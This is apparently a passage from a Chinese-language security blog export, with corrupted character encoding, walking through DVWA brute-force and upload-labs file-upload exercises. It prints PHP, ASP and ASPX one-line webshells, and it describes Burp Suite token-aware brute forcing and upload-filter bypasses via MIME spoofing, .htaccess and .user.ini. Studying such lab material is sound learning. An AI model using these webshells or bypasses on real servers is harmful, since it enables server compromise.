= $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; è¡¥å……â€”â€” $GLOBALS ï¼šå¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ã€‚$GLOBALS è¿™ç§å…¨å±€å˜é‡ç”¨äºåœ¨ PHP è„šæœ¬ä¸­çš„ä»»æ„ä½ç½®è®¿é—®å…¨å±€å˜é‡ï¼ˆä»å‡½æ•°æˆ–æ–¹æ³•ä¸­å‡å¯ï¼‰ã€‚PHP åœ¨åä¸º $GLOBALS[index] çš„æ•°ç»„ä¸­å­˜å‚¨äº†æ‰€æœ‰å…¨å±€å˜é‡ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚ é€šè¿‡ä»£ç å®¡è®¡æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒæœåŠ¡å™¨ä½¿ç”¨äº†Anti-CSRF tokenæ¥æŠµå¾¡CSRFçš„æ”»å‡»ï¼Œä½¿ç”¨äº†stripslasheså‡½æ•°å’Œmysqli_real_esacpe_stringæ¥æŠµå¾¡SQLæ³¨å…¥å’ŒXSSçš„æ”»å‡»ã€‚è€Œä¸”ç”±äºä½¿ç”¨äº†Anti-CSRF tokenï¼Œæ¯æ¬¡æœåŠ¡å™¨è¿”å›åˆ°ç™»é™†é¡µé¢ä¸­éƒ½ä¼šåŒ…å«ä¸€ä¸ªéšæœºçš„user_tokençš„å€¼ï¼Œç”¨æˆ·æ¯æ¬¡ç™»å½•æ—¶éƒ½è¦å°†user_tokenä¸€èµ·æäº¤ã€‚æœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚åï¼Œä¼šä¼˜å…ˆåštokençš„æ£€æŸ¥ï¼Œå†è¿›è¡ŒsqlæŸ¥è¯¢ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä¸èƒ½å†åƒlowå’Œmediumçº§åˆ«ä¸€æ ·ï¼Œåˆ©ç”¨burpsuiteè¿›è¡Œæ— è„‘å¼çš„çˆ†ç ´äº†ã€‚ è¿™å…³å¯ä»¥æœ‰ä¸¤ç§è§£æ³•ï¼Œä¸€ç§æ˜¯åˆ©ç”¨paythonè„šæœ¬ä»htmlé¡µé¢ä¸­æŠ“å–user_tokençš„å€¼ï¼ˆä½†æ˜¯æˆ‘è¿˜æ²¡å­¦paythonï¼Œç­‰ä»¥åè¡¥å§ï¼‰ï¼Œå¦ä¸€ç§æ˜¯ä»ä½¿ç”¨burpï¼Œå› ä¸ºå³ä½¿æˆ‘ä»¬è¾“é”™å¯†ç ï¼Œ sleep( rand( 0, 3 ) )ä¹Ÿåªä¼šç½‘é¡µå»¶è¿Ÿ0åˆ°3ç§’ï¼Œä¸è¶³ä»¥é˜²å¾¡æš´åŠ›ç ´è§£ã€‚ä½†æˆ‘ä»¬éœ€è¦æ›´æ¢æ”»å‡»æ¨¡å¼ç­‰ï¼Œæˆ‘ä»¬ä¸‹é¢å±•å¼€æ¥è®²ï¼š å°†æ”»å‡»æ¨¡å¼æ”¹ä¸ºPitchfork{è‰å‰æ¨¡å¼ â€”â€”å®ƒå¯ä»¥ä½¿ç”¨å¤šç»„Payloadé›†åˆï¼Œåœ¨æ¯ä¸€ä¸ªä¸åŒçš„Payloadæ ‡å¿— ä½ç½®ä¸Šï¼ˆæœ€å¤š20ä¸ªï¼‰ï¼Œéå†æ‰€æœ‰çš„Payloadã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªPayloadæ ‡å¿—ä½ç½®ï¼Œ ç¬¬ä¸€ä¸ªPayloadå€¼ä¸ºAå’ŒBï¼Œç¬¬äºŒä¸ªPayloadå€¼ä¸ºaå’Œbï¼Œåˆ™å‘èµ·æ”»å‡»æ—¶ï¼Œå°†å…±å‘èµ·ä¸¤æ¬¡æ”» å‡»ï¼Œç¬¬ä¸€æ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºAå’Œaï¼Œç¬¬äºŒæ¬¡ä½¿ç”¨çš„Payloadåˆ†åˆ«ä¸ºBå’Œbã€‚}å¹¶å°†passwordå’Œuser_tokenè®¾ä¸ºå˜é‡ã€‚![5](DVWAâ€”Brute Force/5-1614780376113.png) ç¬¬ä¸€ä¸ªå˜é‡passwordæˆ‘ä»¬å°±ç…§å¸¸è½½å…¥å­—å…¸å°±å¯ä»¥äº†ã€‚ç¬¬äºŒä¸ªå˜é‡user_tokençš„payloadè®¾ç½®æˆ‘ä»¬é€‰æ‹©Recursive grep é€‰é¡¹ï¼ˆRecursive grepâ€”â€”æ­¤Payloadç±»å‹ä¸»è¦ä½¿ç”¨äºä»æœåŠ¡å™¨ç«¯æå–æœ‰æ•ˆæ•°æ®çš„åœºæ™¯ï¼Œéœ€è¦å…ˆä»æœåŠ¡å™¨çš„å“åº”ä¸­æå–æ•°æ®ä½œä¸ºPayloadï¼Œç„¶åæ›¿æ¢Payloadçš„ä½ç½®ï¼Œè¿›è¡Œ æ”»å‡»ã€‚å®ƒçš„æ•°æ®æ¥æºäº†åŸå§‹çš„å“åº”æ¶ˆæ¯ï¼ŒåŸºäºåŸå§‹å“åº”ï¼Œåœ¨Payloadçš„å¯é€‰é¡¹è®¾ç½® ï¼ˆOptionsï¼‰çš„ Grep-Extractä¸­é…ç½®Grepè§„åˆ™ï¼Œç„¶åæ ¹æ®grepå»æå–æ•°æ®æ‰èƒ½å‘ç”Ÿæ”»å‡»ï¼‰ï¼Œç„¶åæˆ‘ä»¬åœ¨option é€‰é¡¹ä¸­æ‰¾åˆ° Grep-Extract ,ç‚¹å‡» Add, ç„¶åç‚¹å‡» Refetch repose å³å¯çœ‹åˆ°æŠ“å–åˆ°çš„æºä»£ç äº†ï¼Œæˆ‘ä»¬æ‰¾åˆ° user_token çš„å€¼valueï¼Œé€‰ä¸­å®ƒï¼Œä¹‹åç‚¹å‡»okã€‚![6](DVWAâ€”Brute Force/6.png) ![7](DVWAâ€”Brute Force/7-1614781678680.png) å…¶å®ä¸Šè¿°çš„æ“ä½œåªæ˜¯ä¸ºäº†è¾¾åˆ°ä¸€ä¸ªç›®çš„ï¼šç”±äºæ¯æ¬¡è®¿é—®æœåŠ¡å™¨åï¼Œuser_tokenéƒ½ä¼šåˆ·æ–°ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¦è®©å˜é‡user_tokenâ€ä¸æ—¶ä¿±è¿›â€œã€‚ æ­¤å¤–æˆ‘ä»¬è¦å°†çº¿ç¨‹è®¾ä¸º1ï¼Œå› ä¸ºrecursive grep payloads cannot be used with multiple request threadsã€‚åŒæ—¶ åœ¨ Options ä¸­æ‰¾åˆ° Redirections è®¾ç½®ä¸º Alwaysã€‚åšå®Œè¿™äº›å‡†å¤‡æ“ä½œï¼Œå°±å¯ä»¥ç‚¹å‡»start attackå¼€å§‹çˆ†ç ´ï¼Œ ![8](DVWAâ€”Brute Force/8.png) æˆ‘ä»¬å¯ä»¥æœ‰ä¸¤ä¸ªå€¼çš„å›æ–‡é•¿åº¦å¼‚å¸¸ï¼Œæˆ‘ä»¬ç‚¹å‡»æ•°æ®å…·ä½“æŸ¥çœ‹å›æ–‡ï¼Œå‘ç°å¯†ç ä¸ºpaawordæ—¶ç™»å…¥æˆåŠŸï¼š ![9](DVWAâ€”Brute Force/9.png)","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"upload-labs-pass1â€”13","date":"2021-02-09T11:32:20.000Z","path":"2021/02/09/upload-labs-pass1-13/","text":"[TOC] å‰è¨€upload-labsä¸»è¦æ˜¯ä¸€äº›é’ˆå¯¹æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„å®éªŒã€‚ å†æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œå…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Ÿ æ–‡ä»¶ä¸Šä¼ æ¼æ´æ˜¯æŒ‡ç”¨æˆ·ä¸Šä¼ äº†ä¸€ä¸ªå¯æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ï¼Œå¹¶é€šè¿‡æ­¤è„šæœ¬æ–‡ä»¶è·å¾—äº†æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤çš„èƒ½åŠ›ã€‚å¸¸è§åœºæ™¯æ˜¯webæœåŠ¡å™¨å…è®¸ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡æˆ–è€…æ™®é€šæ–‡æœ¬æ–‡ä»¶ä¿å­˜ï¼Œè€Œç”¨æˆ·ç»•è¿‡ä¸Šä¼ æœºåˆ¶ä¸Šä¼ æ¶æ„ä»£ç å¹¶æ‰§è¡Œä»è€Œæ§åˆ¶æœåŠ¡å™¨ã€‚æ˜¾ç„¶è¿™ç§æ¼æ´æ˜¯getshellæœ€å¿«æœ€ç›´æ¥çš„æ–¹æ³•ä¹‹ä¸€ï¼Œéœ€è¦è¯´æ˜çš„æ˜¯ä¸Šä¼ æ–‡ä»¶æ“ä½œæœ¬èº«æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œé—®é¢˜åœ¨äºæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨åï¼ŒæœåŠ¡å™¨æ€ä¹ˆå¤„ç†å’Œè§£é‡Šæ–‡ä»¶ã€‚webåº”ç”¨ç¨‹åºé€šå¸¸å¸¦æœ‰æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ï¼Œæ¯”å¦‚åœ¨åšå®¢å‘è¡¨æ–‡ç« éœ€è¦ä¸Šä¼ å›¾ç‰‡ç­‰è¡Œä¸ºå°±å¯èƒ½å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚æ–‡ä»¶ä¸Šä¼ æ¼æ´å°±æ˜¯åˆ©ç”¨ç½‘é¡µä»£ç ä¸­çš„æ–‡ä»¶ä¸Šä¼ è·¯å¾„å˜é‡è¿‡æ»¤ä¸ä¸¥å°†ï¼Œå°†å¯æ‰§è¡Œçš„æ–‡ä»¶ä¸Šä¼ åˆ°ä¸€ä¸ªåˆ°æœåŠ¡å™¨ä¸­ï¼Œå†é€šè¿‡URLå»è®¿é—®ä»¥æ‰§è¡Œæ¶æ„ä»£ç â€”â€”æ”»å‡»è€…å¯ä»¥ç›´æ¥ä¸Šä¼ WebShellï¼ˆä»¥aspã€phpæˆ–è€…jspç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ï¼‰åˆ°æœåŠ¡å™¨ä¸Šã€‚ç„¶ååˆ©ç”¨æ¸—é€å·¥å…·ï¼ˆå¦‚èšå‰‘ï¼‰è¿æ¥webshellä»¥è¾¾åˆ°æ“ä½œæœåŠ¡å™¨çš„ç›®çš„ã€‚ ä¸Šä¼ æ¼æ´ç±»å‹å¤§ä½“å¯åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š åˆ¤æ–­ä¸Šä¼ æ¼æ´ç±»å‹çš„æ€è·¯ï¼š webshellï¼ˆä¸€å¥è¯æœ¨é©¬ï¼‰çš„åˆ¶å¤‡ 1æ¨¡æ¿ï¼š &lt;?php @eval($_POST[&#x27;password&#x27;]);?&gt; @è¡¨ç¤ºåé¢å³ä½¿æ‰§è¡Œé”™è¯¯ï¼Œä¹Ÿä¸æŠ¥é”™ã€‚evalï¼ˆï¼‰å‡½æ•°è¡¨ç¤ºæ‹¬å·å†…çš„è¯­å¥å­—ç¬¦ä¸²ä»€ä¹ˆçš„å…¨éƒ½å½“åšä»£ç æ‰§è¡Œã€‚$_POST[&#39;password&#39;]è¡¨ç¤ºä»é¡µé¢ä¸­ç”¨postçš„æ–¹å¼è·å¾—passwordè¿™ä¸ªå‚æ•°å€¼ã€‚ é‚£ä¹ˆè¿™å¥è¯çš„ä½œç”¨æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿä¸¾ä¸ªä¾‹å­ï¼špassword=echo â€˜aâ€™ï¼Œå°±ç›¸å½“äº&lt; ?php @eval(â€œecho â€˜aâ€™â€);? &gt;å³å†ç½‘é¡µä¸Šè¾“å‡ºä¸€ä¸ªaã€‚æˆ‘ä»¬çŸ¥é“äº†è¿™ä¸ªå°±å¯ä»¥æ ¹æ®æ”¹å˜passwordçš„å€¼æ¥è¾¾åˆ°æ“æ§æœåŠ¡å™¨çš„ç›®çš„äº†ï¼Œæˆ–è€…æˆ‘ä»¬å¯ä»¥è¿æ¥èšå‰‘ï¼Œä¸€é”®è·å–ç›®æ ‡æœåŠ¡å™¨ã€‚ è¡¥å……ï¼š å…¥ä¾µçš„æ¡ä»¶ ï¼ˆ1ï¼‰æœ¨é©¬ä¸Šä¼ æˆåŠŸï¼Œæœªè¢«æ€ï¼›ï¼ˆ2ï¼‰çŸ¥é“æœ¨é©¬çš„è·¯å¾„åœ¨å“ªï¼›ï¼ˆ3ï¼‰ä¸Šä¼ çš„æœ¨é©¬èƒ½æ­£å¸¸è¿è¡Œã€‚ å¸¸è§çš„ä¸€å¥è¯æœ¨é©¬ phpçš„ä¸€å¥è¯æœ¨é©¬ï¼š &lt; ?php @eval($_POST[â€˜passâ€™]);? &gt;aspçš„ä¸€å¥è¯æ˜¯ï¼š &lt;%eval request (â€œpassâ€)%&gt;aspxçš„ä¸€å¥è¯æ˜¯ï¼š &lt;%@ Page Language=â€Jscriptâ€%&gt; &lt;%eval(Request.Item[â€œpassâ€],â€unsafeâ€);%&gt; pass-01ï¼šjsæ£€æŸ¥æ‰“å¼€pass-01çš„index.phpæŸ¥çœ‹æºç ï¼Œæˆ‘ä»¬çœ‹åˆ°ç½‘é¡µå¯¹ä¸Šä¼ çš„å›¾ç‰‡åšäº†jsæ£€æŸ¥ï¼Œ è€Œä¸”è®¾ç½®äº†ä¸Šä¼ ç™½åå•ï¼Œ å› æ­¤é¢˜ç›®è¦æ±‚æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªwebshellåˆ°æœåŠ¡å™¨ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æœ‰ä»¥ä¸‹ä¸‰ç§æ€è·¯ï¼š åˆ é™¤é‚£æ®µæœ‰å…³jsæ£€æŸ¥çš„ä»£ç  å¢åŠ ç™½åå•ä¸­å¯ä¸Šä¼ æ–‡ä»¶ç±»å‹ å…ˆå°†ä¸Šä¼ æ–‡ä»¶ç±»å‹æ”¹ä¸ºç™½åå•çš„ä¸€ç§ï¼ˆä½¿å…¶é€šè¿‡jsæ£€æŸ¥ï¼‰ç„¶åç”¨burpæŠ“åŒ…ï¼Œå†å°†å…¶æ–‡ä»¶åç¼€æ›´æ”¹ä¸ºé¢„æœŸæ–‡ä»¶ç±»å‹ pass-02ï¼šMIMEç»•è¿‡ æŸ¥çœ‹æç¤ºï¼šæœ¬passåœ¨æœåŠ¡ç«¯å¯¹æ•°æ®åŒ…çš„MIMEè¿›è¡Œæ£€æŸ¥ã€‚ MIMEï¼šMIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚åœ¨HTTPä¸­ï¼ŒMIMEç±»å‹è¢«å®šä¹‰åœ¨Content-Type headerä¸­ã€‚ å¸¸è§çš„MIMEç±»å‹ï¼š udio/mpeg -&gt; .mp3application/msword -&gt; .docapplication/octet-stream -&gt; .exeapplication/pdf -&gt; .pdfapplication/x-javascript -&gt; .jsapplication/x-rar -&gt; .rarapplication/zip -&gt; .zipimage/gif -&gt; .gifimage/jpeg -&gt; .jpg / .jpegimage/png -&gt; .pngtext/plain -&gt; .txttext/html -&gt; .htmlvideo/mp4 -&gt; .mp4 æŸ¥çœ‹æºç ï¼š ä¹Ÿå°±æ˜¯è¯´æœåŠ¡å™¨è¿˜æ˜¯è§„å®šäº†ç™½åå•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æœ‰ä»¥ä¸‹ä¸¤ç§æ€è·¯ï¼š 1.å…ˆå°†webshellåç¼€ç±»å‹æ”¹ä¸ºå…è®¸ä¸Šä¼ çš„æ–‡ä»¶åç¼€ç±»å‹ï¼ˆä½¿å…¶ç»•è¿‡MIMEæ£€æŸ¥ï¼‰ï¼Œç„¶åburpæŠ“åŒ…ï¼Œå°†webshellåç¼€æ”¹å›.phpã€‚ 2.å°†webshell.phpæ–‡ä»¶ä¸Šä¼ ï¼ŒburpæŠ“åŒ…ï¼Œå°†Content-Typeçš„MIMEç±»å‹æ”¹ä¸ºç™½åå•ä¸­çš„ç±»å‹ã€‚ spï¼šæˆ‘åœ¨çœ‹æºç çš„æ—¶å€™å‘ç°è¿™å…³çš„æºç ä¹Ÿå­˜åœ¨jsæ£€æŸ¥çš„æºç ï¼Œä½†æ˜¯æˆ‘å‘ç°æŠŠè¿™æ®µç åˆ äº†å¹¶ä¸èƒ½å®ç°ä¸Šä¼ webshellï¼Œå› ä¸ºæºç ä¸­æ²¡æœ‰è§„å®šcheckfile()çš„ä½œç”¨ï¼Œè€Œä¸”æœåŠ¡å™¨æ˜¯é€šè¿‡ifè¯­å¥åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦ç¬¦åˆã€‚ pass-03ï¼šä¸Šä¼ ç‰¹æ®Šå¯è§£æåç¼€ æŸ¥çœ‹æºç ï¼š 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //æ”¶å°¾å»ç©º if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å¯¹ä¸Šä¼ æ–‡ä»¶åšäº†å¾ˆå¤šè¿‡æ»¤å¤„ç†ï¼ŒåŒ…æ‹¬è®¾å®šäº†é»‘åå•ã€‚ è¿™è¾¹æˆ‘ä»¬è¡¥å……ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼šApacheè§£æé¡ºåºæ˜¯ä»å³åˆ°å·¦å¼€å§‹è§£ææ–‡ä»¶åç¼€ï¼Œå¦‚æœæœ€å³ä¾§æ‰©å±•åä¸èƒ½è¯†åˆ«çš„è¯ï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ï¼Œç›´åˆ°é‡åˆ°å¯ä»¥è§£æçš„æ–‡ä»¶åç¼€ä¸ºæ­¢ã€‚è€Œä¸”Apacheçš„httpd.confä¸­å¯ä»¥è¿›è¡Œé…ç½®ï¼ˆAddType application/x-httpd-php .php .php3 .phtmlï¼‰ï¼Œè§„å®šå“ªäº›æ–‡ä»¶åç¼€æ˜¯ä»¥phpæ ¼å¼æ¥è§£æçš„ã€‚ â€‹ æˆ‘ä»¬çœ‹åˆ°é»‘åå•ä¸­æ²¡æœ‰ç¦ç”¨è¿™äº›å¯è§£æåç¼€ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œä¸Šä¼ å¯è§£æåç¼€ã€‚ spï¼šå¸¸ç”¨å¯è§£æåç¼€ é™Œç”Ÿå‡½æ•°ï¼š ï¼strrchr() å‡½æ•° åŠŸèƒ½ï¼šæŸ¥æ‰¾å­—ç¬¦ï¼Œåœ¨æŒ‡å®šå­—ç¬¦ä¸²ä¸­ä»åé¢å¼€å§‹çš„ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚ è¯­æ³•ï¼šstrrchr(stringï¼Œchar) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚ char å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚å¦‚æœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…æ•°å­— ASCII å€¼çš„å­—ç¬¦ã€‚ ï¼trim()å‡½æ•° åŠŸèƒ½ï¼šé™¤å»å­—ç¬¦ä¸²å¼€å¤´å’Œæœ«å°¾çš„ç©ºæ ¼æˆ–å…¶ä»–å­—ç¬¦ã€‚ è¯­æ³•ï¼štrim (string $str [,string $charlist ]) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚ charlist å¯é€‰ã€‚è§„å®šä»å­—ç¬¦ä¸²ä¸­åˆ é™¤å“ªäº›å­—ç¬¦ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œåˆ™ç§»é™¤ä¸‹åˆ—æ‰€æœ‰å­—ç¬¦ï¼šâ€\\0â€ - NULL ï¼›â€\\tâ€ - åˆ¶è¡¨ç¬¦ï¼› â€œ\\nâ€ - æ¢è¡Œï¼› â€œ\\x0Bâ€ - å‚ç›´åˆ¶è¡¨ç¬¦ï¼› â€œ\\râ€ - å›è½¦ ï¼›â€ â€œ - ç©ºæ ¼ ï¼in_array()å‡½æ•° åŠŸèƒ½ï¼šæœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚ è¯­æ³•ï¼šin_array(search,array,type) å‚æ•° æè¿° search å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚ array å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚ type å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚å¦‚æœ search å‚æ•°æ˜¯å­—ç¬¦ä¸²ä¸” type å‚æ•°è¢«è®¾ç½®ä¸º TRUEï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚ ï¼move_uploaded_file() å‡½æ•° åŠŸèƒ½ï¼šå°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚ è¯­æ³•ï¼šmove_uploaded_file(file,newloc) å‚æ•° æè¿° file å¿…éœ€ã€‚è§„å®šè¦ç§»åŠ¨çš„æ–‡ä»¶ã€‚ newloc å¿…éœ€ã€‚è§„å®šæ–‡ä»¶çš„æ–°ä½ç½®ã€‚ æ³¨ï¼šè¿™å…³æˆ‘æ²¡èƒ½å®ç°åœ¨æœ¬åœ°å¤ç°ï¼Œä¸Šä¼ shellåç”¨èšå‰‘è¿æ¥ä¸ä¸Šï¼Œå¥½åƒæ˜¯Apacheçš„ç‰ˆæœ¬ä¸èƒ½å¤ªé«˜ã€‚ ï¼str_ireplace() å‡½æ•° åŠŸèƒ½ï¼šæ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚ è¯­æ³•ï¼šstr_ireplace(find,replace,string,count) å‚æ•° æè¿° find å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼ã€‚ replace å¿…éœ€ã€‚è§„å®šæ›¿æ¢ find ä¸­çš„å€¼çš„å€¼ã€‚ string å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚ count å¯é€‰ã€‚ä¸€ä¸ªå˜é‡ï¼Œå¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°ã€‚ pass-04ï¼šä¸Šä¼ .htaccess è¿™å…³çš„é»‘åå•æ·»åŠ äº†å¯è§£æåç¼€ï¼Œä½†æ˜¯å¿½ç•¥äº†.htaccessç±»å‹ã€‚ htaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹ç½‘é¡µé…ç½®ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ç½‘é¡µ301é‡å®šå‘ï¼Œè‡ªå®šä¹‰404é”™è¯¯é¡µé¢ï¼Œæ”¹å˜æ–‡ä»¶æ‰©å±•åç­‰åŠŸèƒ½ã€‚å…¶ä¸­.htaccessæ–‡ä»¶å†…å®¹:SetHandler application/x-httpd-phpè®¾ç½®å½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶éƒ½ä½¿ç”¨PHPè§£æï¼Œæ— è®ºä¸Šä¼ ä»»ä½•ç±»å‹æ–‡ä»¶ï¼Œåªè¦æ–‡ä»¶å†…å®¹ç¬¦åˆphpè¯­è¨€ä»£ç è§„èŒƒï¼Œå°±ä¼šè¢«å½“åšphpæ–‡ä»¶æ‰§è¡Œã€‚ å› æ­¤è¿™å…³çš„æ€è·¯æ˜¯ï¼šå…ˆä¸Šä¼ ä¸€ä¸ªåç¼€ä¸º.htaccessï¼Œå†…å®¹ä¸ºï¼šSetHandler application/x-httpd-php â€‹ &lt;FilesMatch â€œwebshell.jpgâ€&gt; æˆ– SetHandler application/x-httpd-php çš„æ–‡ä»¶ï¼Œç„¶åå†ä¸Šä¼ webshell.jpgå³å¯ã€‚ â€‹ æ³¨ï¼šè¿™å…³æˆ‘æ²¡èƒ½å®ç°åœ¨æœ¬åœ°å¤ç°ï¼Œä¸Šä¼ shellåç”¨èšå‰‘è¿æ¥ä¸ä¸Šï¼Œå¥½åƒæ˜¯Apacheçš„ç‰ˆæœ¬ä¸èƒ½å¤ªé«˜ã€‚ pass-05 pass-04æ˜¯åˆ©ç”¨Apacheçš„è§£ææ–‡ä»¶è¿›è¡Œç»•è¿‡é»‘åå•ï¼Œè¿™å…³åˆ™æ˜¯åˆ©ç”¨PHPçš„è§£ææ–¹å¼ç»•è¿‡é»‘åå•ã€‚ æˆ‘ä»¬çœ‹åˆ°é»‘åå•é‡Œåˆå¤šåŠ äº†ä¸€ä¸ªhtaccessç±»å‹ï¼Œä½†æ˜¯phpé…ç½®æ–‡ä»¶ç±»å‹php.iniæ²¡æœ‰è¢«ç¦ç”¨ï¼Œä¸”æç¤ºå‘Šè¯‰æˆ‘ä»¬ä¸Šä¼ ç›®å½•å­˜åœ¨phpæ–‡ä»¶ï¼ˆreadme.phpï¼‰ã€‚ é‚£ä¹ˆè¿™å…³çš„æ€è·¯ï¼šå…ˆä¸Šä¼ ä¸€ä¸ªåç¼€ä¸º.user.iniï¼ˆç›¸å½“äºç”¨æˆ·è‡ªå®šä¹‰çš„php.iniï¼‰å†…å®¹ä¸º 